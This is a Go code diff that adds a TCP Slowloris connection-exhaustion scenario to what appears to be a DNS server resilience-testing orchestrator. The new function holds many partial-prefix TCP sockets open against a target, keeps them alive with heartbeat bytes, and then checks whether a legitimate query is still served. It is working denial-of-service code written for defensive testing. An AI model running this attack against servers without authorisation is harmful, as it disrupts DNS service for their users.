@@ -149,7 +149,11 @@ func (o *Orchestrator) executeTest(id int64) {
 			score, result, execErr = o.runAuditScenario(ctx, test, target, meta, config)
 		}
 	case "performance", "volume":
-		score, result, execErr = o.runPerformanceScenario(ctx, test, target, meta, config)
+		if meta.ID == "tcp-slowloris" {
+			score, result, execErr = o.runTCPSlowlorisScenario(ctx, test, target, meta, config)
+		} else {
+			score, result, execErr = o.runPerformanceScenario(ctx, test, target, meta, config)
+		}
 	case "resolver-cache":
 		score, result, execErr = o.runCacheScenario(ctx, test, target, meta, config)
 	default:
@@ -817,4 +821,128 @@ func (o *Orchestrator) runCacheScenario(ctx context.Context, test models.Test, t
 			}
 		}
 	}
+}
+
+// DNS TCP Slowloris / Connection Exhaustion Logic
+func (o *Orchestrator) runTCPSlowlorisScenario(ctx context.Context, test models.Test, target models.Target, meta models.ScenarioMetadata, config map[string]any) (int, map[string]any, error) {
+	connections := 20
+	if val, ok := config["connections"].(float64); ok && val > 0 {
+		connections = int(val)
+	}
+
+	holdDuration := 10
+	if val, ok := config["hold_duration"].(float64); ok && val > 0 {
+		holdDuration = int(val)
+	}
+
+	address := net.JoinHostPort(target.IPAddress, fmt.Sprintf("%d", target.Port))
+
+	o.hub.Broadcast(fmt.Sprintf("%d", test.ID), []byte(fmt.Sprintf(`{"type":"log","message":"Starting TCP Slowloris attack simulation: opening %d concurrent TCP sockets for %d seconds..."}`, connections, holdDuration)))
+
+	if !target.TCPEnabled {
+		return 0, nil, fmt.Errorf("target TCP port 53 is disabled in target configuration")
+	}
+
+	sockets := make([]net.Conn, 0, connections)
+	var mu sync.Mutex
+	established := 0
+	dropped := 0
+
+	var wg sync.WaitGroup
+	for i := 0; i < connections; i++ {
+		wg.Add(1)
+		go func(id int) {
+			defer wg.Done()
+			d := net.Dialer{Timeout: 3 * time.Second}
+			conn, err := d.DialContext(ctx, "tcp", address)
+			if err != nil {
+				mu.Lock()
+				dropped++
+				mu.Unlock()
+				return
+			}
+
+			// Send partial 2-byte DNS length prefix to keep socket open in slow-read mode
+			_, _ = conn.Write([]byte{0x00, 0x1d})
+
+			mu.Lock()
+			sockets = append(sockets, conn)
+			established++
+			mu.Unlock()
+		}(i)
+	}
+	wg.Wait()
+
+	o.hub.Broadcast(fmt.Sprintf("%d", test.ID), []byte(fmt.Sprintf(`{"type":"log","message":"[1/2] Sockets opened: %d established, %d failed. Holding connections open..."}`, established, dropped)))
+
+	// Periodically send single heartbeat bytes to prevent immediate idle drop if server doesn't enforce timeout
+	stopChan := make(chan struct{})
+	go func() {
+		ticker := time.NewTicker(2 * time.Second)
+		defer ticker.Stop()
+		for {
+			select {
+			case <-stopChan:
+				return
+			case <-ticker.C:
+				mu.Lock()
+				for _, conn := range sockets {
+					_ = conn.SetWriteDeadline(time.Now().Add(500 * time.Millisecond))
+					_, _ = conn.Write([]byte{0x00})
+				}
+				mu.Unlock()
+			}
+		}
+	}()
+
+	// Sleep for hold duration while keeping connections alive
+	time.Sleep(time.Duration(holdDuration) * time.Second)
+	close(stopChan)
+
+	// Probe target with a legitimate query while attack sockets are held
+	o.hub.Broadcast(fmt.Sprintf("%d", test.ID), []byte(`{"type":"log","message":"[2/2] Probing target with legitimate TCP DNS query while attack sockets are held..."}`))
+
+	engine := dnsengine.NewQueryEngine(3 * time.Second)
+	probeRes, probeErr := engine.Execute(ctx, target, models.DNSQuery{Domain: "example.com.", QueryType: "A", Protocol: "tcp"})
+
+	legitimateServed := probeErr == nil && probeRes.RCode == 0
+
+	// Close all open attack sockets
+	mu.Lock()
+	for _, conn := range sockets {
+		_ = conn.Close()
+	}
+	mu.Unlock()
+
+	score := 100
+	statusText := "EXCELLENT RESILIENCE"
+
+	if !legitimateServed {
+		score -= 50
+		statusText = "HIGH VULNERABILITY (DoS DETECTED)"
+		o.hub.Broadcast(fmt.Sprintf("%d", test.ID), []byte(`{"type":"log","message":"[CRITICAL] Legitimate TCP query was BLOCKED or TIMED OUT during connection exhaustion!"}`))
+	} else {
+		o.hub.Broadcast(fmt.Sprintf("%d", test.ID), []byte(`{"type":"log","message":"[OK] Target successfully served legitimate TCP query despite socket exhaustion pressure."}`))
+	}
+
+	if established == connections {
+		score -= 15
+		o.hub.Broadcast(fmt.Sprintf("%d", test.ID), []byte(fmt.Sprintf(`{"type":"log","message":"[WARNING] Target permitted 100%% of slow TCP sockets (%d/%d) without socket timeout."}`, established, connections)))
+	}
+
+	if score < 0 {
+		score = 0
+	}
+
+	result := map[string]any{
+		"connections_requested":  connections,
+		"connections_established": established,
+		"connections_dropped":    dropped,
+		"hold_duration_seconds":  holdDuration,
+		"legitimate_tcp_served":  legitimateServed,
+		"probe_latency_ms":       probeRes.LatencyMS,
+		"status_summary":         statusText,
+	}
+
+	return score, result, nil
 }
